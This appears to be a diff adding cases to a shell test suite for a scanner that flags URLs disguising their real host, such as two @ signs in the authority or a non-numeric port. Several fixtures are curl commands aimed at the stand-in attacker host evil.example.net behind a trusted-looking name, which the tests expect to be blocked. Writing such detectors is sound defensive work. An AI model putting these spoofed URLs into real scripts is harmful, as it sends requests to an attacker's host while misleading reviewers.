@@ -470,6 +470,25 @@ check "userinfo before a declared host is fine" allow "$sample_dir/a2.sh" \
 check "an expression in userinfo does not hide the host" block "$sample_dir/a3.yml" \
   '      - run: curl "https://${{ env.X }}@evil.example.net/v1"'
 
+# TWO @ signs. Every URL parser splits the authority at the LAST one, and
+# `${hostport##*@}` is written to that rule, so a grammar that stopped at
+# the first @ handed over the middle component -- a declared host vouching
+# for a destination that is not it.
+check "a declared host between two @ signs does not vouch" block "$sample_dir/a7.sh" \
+  'curl "https://a@user-api.erpc.global@evil.example.net/x"'
+
+check "a password before two @ signs does not vouch either" block "$sample_dir/a8.sh" \
+  'curl "https://u:p@user-api.erpc.global@evil.example.net/x"'
+
+# The boundary guard: in a code file the match must end where an authority
+# legally can. A non-numeric port is not a port, so the match stops short
+# and the host is a prefix of what a reader sees.
+check "a match that stops inside an authority is reported" block "$sample_dir/a9.sh" \
+  'curl "https://user-api.erpc.global:x.evil.example.net/y"'
+
+check "the same shape in prose is left alone" allow "$sample_dir/a10.md" \
+  'See [ERPC](https://erpc.global): the multi-chain endpoint.'
+
 # IP-literal. The brackets are terminal: anything after the ] is a new
 # token, never part of this host.
 check "a bracketed host does not absorb the next scheme" block "$sample_dir/a4.sh" \
